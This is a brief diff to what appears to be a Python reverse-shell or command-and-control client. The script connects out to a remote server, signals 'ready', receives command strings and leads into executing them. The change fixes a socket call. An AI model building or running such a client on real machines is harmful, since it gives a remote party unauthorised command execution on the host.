@@ -155,8 +155,9 @@ def main():
     # server_socket.bind((server_ip, server_port))
     server_socket.connect((server_ip, server_port))
     while True:
-        server_socket.listen(1)
-        print("Server is listening for incoming connections...")
+        # get message from server
+        server_socket.send("ready".encode())
+        # print("Server is listening for incoming connections...")
         command = server_socket.recv(4096).decode("utf-8")
         print("Command received:", command)
             # Execute the command
